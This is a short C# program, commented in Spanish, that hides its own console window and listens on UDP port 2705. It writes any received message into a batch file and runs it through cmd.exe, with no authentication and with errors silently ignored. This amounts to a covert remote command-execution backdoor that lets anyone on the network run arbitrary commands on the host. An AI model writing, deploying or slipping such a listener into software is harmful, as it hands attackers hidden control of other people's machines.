using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

class UDPServer
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    static void Main()
    {
        int port = 2705; // Cambia el puerto según tu necesidad
        UdpClient udpServer = new(port);

        // Oculta la ventana de consola al inicio
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        while (true)
        {
            IPEndPoint remoteEP = new(IPAddress.Any, port);
            byte[] data = udpServer.Receive(ref remoteEP);
            string message = Encoding.ASCII.GetString(data);

            // Verifica si el mensaje contiene ',' y realiza el reemplazo
            if (message.Contains(","))
            {
                message = message.Replace(",", Environment.NewLine);
            }

            string filePath = "archivo.bat";

            // Crea un nuevo archivo .bat con el mensaje recibido
            using (StreamWriter writer = new(filePath))
            {
                writer.WriteLine("@echo off");
                writer.WriteLine(message);
            }

            // Ejecuta el archivo .bat en un hilo aparte para evitar bloquear el bucle principal
            ThreadPool.QueueUserWorkItem(state => ExecuteBatchFile(filePath));

            Thread.Sleep(100); // Agrega un retardo para reducir el uso de CPU
        }
    }

    static void ExecuteBatchFile(string filePath)
    {
        try
        {
            System.Diagnostics.Process process = new();
            System.Diagnostics.ProcessStartInfo startInfo = new()
            {
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal,
                FileName = "cmd.exe",
                Arguments = "/C " + filePath // Ejecuta el archivo .bat
            };
            process.StartInfo = startInfo;
            process.Start();
        }
        catch (Exception ex)
        {
        }
    }
}